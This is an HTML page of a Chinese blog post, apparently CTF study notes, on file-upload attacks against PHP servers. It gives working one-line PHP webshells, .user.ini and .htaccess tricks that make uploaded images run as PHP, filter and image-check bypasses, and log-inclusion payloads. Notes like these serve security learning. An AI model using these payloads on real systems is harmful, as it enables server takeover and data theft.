@@ -1,0 +1,132 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="userq"><meta name="renderer" content="webkit"><meta name="copyright" content="userq"><meta name="keywords" content="MyBlog"><meta name="description" content="MyBlog"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>文件上传 · Mr.cheng's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MyBlog" type="application/atom+xml">
+</head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">userq</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//1768161086.github.io/" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.cheng's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">文件上传</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2025-01-27</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="文件包含"> 文件包含</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><blockquote>
+<p>文件上传相关知识点介绍</p>
+</blockquote>
+<h1 id="1-一句话木马"><a href="#1-一句话木马" class="headerlink" title="1.一句话木马"></a>1.一句话木马</h1><p>一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>段标签木马（过滤php大小写也可用）:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_POST[&#x27;q&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-过滤木马"><a href="#2-过滤木马" class="headerlink" title="2.过滤木马"></a>2.过滤木马</h1><p>可将一句话木马修改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;</span><br><span class="line">@eval($_POST[&#x27;q&#x27;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-构造后门和隐藏后门文件：-user-ini和-htaccess"><a href="#3-构造后门和隐藏后门文件：-user-ini和-htaccess" class="headerlink" title="3.构造后门和隐藏后门文件：.user.ini和.htaccess"></a>3.构造后门和隐藏后门文件：.user.ini和.htaccess</h1><p>.user.ini配置文件是PHP的，可以在全部环境里生效，而.htaccess配置文件是Apache特有</p>
+<p>.user.ini文件内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=f.jpg</span><br></pre></td></tr></table></figure>
+
+<p>.htaccess文件内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;f.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-相关过滤："><a href="#4-相关过滤：" class="headerlink" title="4.相关过滤："></a>4.相关过滤：</h1><h5 id="1-过滤可用-代替"><a href="#1-过滤可用-代替" class="headerlink" title="1.[]过滤可用{}代替"></a>1.[]过滤可用{}代替</h5><h5 id="2-过滤-；可用："><a href="#2-过滤-；可用：" class="headerlink" title="2.过滤{}[] ；可用："></a>2.过滤{}[] ；可用：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">system(&quot;tac ../fla*&quot;)</span><br><span class="line">?&gt;或&lt;?=`tac ../fl*`?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-日志包含过滤掉空格和-反引号和log："><a href="#3-日志包含过滤掉空格和-反引号和log：" class="headerlink" title="3.日志包含过滤掉空格和&#96;&#96;反引号和log："></a>3.日志包含过滤掉空格和&#96;&#96;反引号和log：</h5><?=include"/var/lo"."g/nginx/access.lo"."g"?>
+
+<p>在UA后＋<?php @eval($_POST['q']);?>也可用<?=include"ph"."p://filter/convert.base64-encode/resource=../flag.p"."hp"?></p>
+<h5 id="4-绕过文件检测：文件开头加GIF89a"><a href="#4-绕过文件检测：文件开头加GIF89a" class="headerlink" title="4.绕过文件检测：文件开头加GIF89a"></a>4.绕过文件检测：文件开头加GIF89a</h5><h5 id="5"><a href="#5" class="headerlink" title="5.&lt;被过滤："></a>5.&lt;被过滤：</h5><p>在.user.ini里包含日志路径：auto_prepend_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log、同时在User-Agent处写php代码</p>
+<h1 id="5-getimagesize和exif-imagetype绕过"><a href="#5-getimagesize和exif-imagetype绕过" class="headerlink" title="5.getimagesize和exif_imagetype绕过"></a>5.getimagesize和exif_imagetype绕过</h1><p>考点：getimagesize和exif_imagetype绕过；apache 的服务器, 很容易想到 .htaccess；但是后端检测了 mine 类型, 如果直接在 .htaccess 开头加⼊ GIF89A 的话访问整个 images ⽬录下的⽂件都会爆 500, 会出现语法错误。.htaccess 通过 # 来注释, 后来了解到还有 \x00</p>
+<h2 id="htacces："><a href="#htacces：" class="headerlink" title=".htacces："></a>.htacces：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">&lt;FilesMatch &quot;hey.hey&quot;&gt;</span><br><span class="line">SetHandler  application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="然后上传hey-hey"><a href="#然后上传hey-hey" class="headerlink" title="然后上传hey.hey"></a>然后上传hey.hey</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">&lt;?php eval($_GET[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑链接</p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://1768161086.github,io">userq</a></p><p> <span>Link:  </span><a href="http://1768161086.github,io/2025/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">http://1768161086.github,io/2025/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2025/01/29/sql%E6%B3%A8%E5%85%A5/" title="sql注入"><span>< PreviousPost</span><br><span class="prevTitle">sql注入</span></a><a class="nextSlogan" href="/2025/01/25/php%E7%89%B9%E6%80%A7/" title="php特性"><span>NextPost ></span><br><span class="nextTitle">php特性</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">1.一句话木马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E8%BF%87%E6%BB%A4%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">2.过滤木马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%9E%84%E9%80%A0%E5%90%8E%E9%97%A8%E5%92%8C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%EF%BC%9A-user-ini%E5%92%8C-htaccess"><span class="toc-number">3.</span> <span class="toc-text">3.构造后门和隐藏后门文件：.user.ini和.htaccess</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E7%9B%B8%E5%85%B3%E8%BF%87%E6%BB%A4%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">4.相关过滤：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%BF%87%E6%BB%A4%E5%8F%AF%E7%94%A8-%E4%BB%A3%E6%9B%BF"><span class="toc-number">4.0.0.0.1.</span> <span class="toc-text">1.[]过滤可用{}代替</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%BF%87%E6%BB%A4-%EF%BC%9B%E5%8F%AF%E7%94%A8%EF%BC%9A"><span class="toc-number">4.0.0.0.2.</span> <span class="toc-text">2.过滤{}[] ；可用：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E8%BF%87%E6%BB%A4%E6%8E%89%E7%A9%BA%E6%A0%BC%E5%92%8C-%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%92%8Clog%EF%BC%9A"><span class="toc-number">4.0.0.0.3.</span> <span class="toc-text">3.日志包含过滤掉空格和&#96;&#96;反引号和log：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B%EF%BC%9A%E6%96%87%E4%BB%B6%E5%BC%80%E5%A4%B4%E5%8A%A0GIF89a"><span class="toc-number">4.0.0.0.4.</span> <span class="toc-text">4.绕过文件检测：文件开头加GIF89a</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5"><span class="toc-number">4.0.0.0.5.</span> <span class="toc-text">5.&lt;被过滤：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-getimagesize%E5%92%8Cexif-imagetype%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">5.getimagesize和exif_imagetype绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#htacces%EF%BC%9A"><span class="toc-number">5.1.</span> <span class="toc-text">.htacces：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E4%B8%8A%E4%BC%A0hey-hey"><span class="toc-number">5.2.</span> <span class="toc-text">然后上传hey.hey</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
